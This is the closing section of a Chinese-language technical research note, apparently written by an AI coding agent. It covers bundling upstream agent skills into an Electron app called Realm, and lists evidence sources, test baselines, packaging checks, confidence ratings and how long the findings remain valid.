- **上游 skill-creator 全量 18 文件 = 225,004 B**（GitHub tree API）；`LICENSE.txt` = Apache-2.0 / 11,357 B
- **install 模式表实测**：33 正例 + 34 反例 + 15 逃逸 + 39 真实命令（三版候选实现对比，见 E-1）
- **`LICENSE.txt` 零诊断 probe**：`refreshSkills` 后 `_cache.diagnostics` = 0、`_cache.errors` = 0、`promptBlock` 长度 = 0
- **测试基线**：`test-ai-bash-policy` 32/32、`test-ai-skills` 64/64、`test-agent-workspace` 21/21
- **环境实测**：node v22.22.0 / python3 3.12.12 / pyyaml 6.0.3 / anthropic 已装 / claude 在 PATH / uv 0.10.5 / `pgrep -fl Realm` 返回 10 条（**正式版正在运行**）

### Secondary (MEDIUM confidence)

- **上游 find-skills 全文**（5,472 B / 141 行 / 12 行含 `npx`）via `raw.githubusercontent.com` —— 已逐行核对 PITFALLS P1 引用的原文（第 100、103 行）
- **上游 skill-creator SKILL.md 全文**（33,168 B）via `raw.githubusercontent.com` —— 标题结构、脚本引用位置、零安装语义（grep 0 命中）
- **上游 skill-creator 的 `scripts/` + `eval-viewer/` + `references/` + `agents/` 共 14 文件** via `raw.githubusercontent.com` —— 全量 install 语义扫描 **0 命中**

### Tertiary (LOW confidence)

- **是否存在其他开放的 Agent-Skills 注册表** —— 未找到（未穷举）。**标记为 A1，建议正文只写已实测的 GitHub 搜索 API。**
- **`make install-nightly` 是否继承 `asarUnpack`** —— 由 `--config.*` 只覆盖指定键的机制推断（**A2**），未实跑验证。

## Metadata

**Confidence breakdown:**

| Area | Level | Reason |
|------|-------|--------|
| **Standard Stack** | **HIGH** | 零新增依赖，全部用 Node 内置 + 仓库既有先例（`fs.cpSync` / `crypto.createHash` / `app.isPackaged`）。四项先例均在本次会话读了源码。 |
| **Architecture（播种模型）** | **HIGH** | 参照实现（`syncSkills` / `safeCopyDir` / `check_env.mjs`）读全文；调用点由 `main.js:4040-4043` 精确定位；`LICENSE.txt` 零影响已实跑 probe 验证；`.seed.json` 结论由 SDK 与 Realm 两层源码交叉确认。 |
| **Architecture（打包）** | **HIGH** | 用 Node 直接解析已构建的 `app.asar` 头部取得实据（59 顶层 / 16,855 文件 / `.planning/` 545）；`files: []` 由 `builder-effective-config.yaml` 实测；nodejieba 的 `**` 嵌套解包有实物证据。 |
| **Architecture（安装档）** | **HIGH** | 33 正例 + 34 反例 + 15 逃逸 + 39 真实命令实测；两版候选对比；插入点由 `ai-bash-policy.js:210-228` 全文确认；2 条断言的破裂由实跑确认。 |
| **Pitfalls** | **HIGH** | 9 条全部有实证支撑（其中 Pitfall 1/2/3/4/7 由本次会话的命令输出直接证实，非推断）。 |
| **Open Questions（Q1/Q2）** | **MEDIUM** | Q1（`agents/` 取舍）与 Q2（modified 判定）是**产品/法务口径决策**，我只能给出推荐与依据，不能替用户拍板。**这两条必须在 plan 期显式决策**（P10 的判据完整性依赖它们）。 |
| **A-2 的第二端点** | **LOW** | 未找到其他可用注册表（A1）。建议正文只写已实测端点。 |

**Research date:** 2026-09-11
**Valid until:** 2026-10-11（30 天）—— 但**两处有更短的保鲜期**：
1. **上游 SHA 与体积**：PINNED，不受时间影响（我们锁定的是 `b0cbd3df…` / `773fb2c7…`，不是 HEAD）。
2. **GitHub API 的速率限制与端点可用性**：**7 天**（第三方 API 的策略可随时调整；`search/code` 的 401 尤其可能变化）。**若 Phase 47 超过 7 天未执行完，建议重跑 A-2 的 4 条 curl 验证。**
3. **`dist/` 里的构建产物**：`dist/mac-arm64/Realm Nightly.app` 是 **2026-09-10** 的构建，其中的 asar 内容反映的是**当时**的仓库状态（不含 `skills-builtin/`）。**Pitfall 4 的验证命令在实施后必须重跑**（用新构建的 asar）。

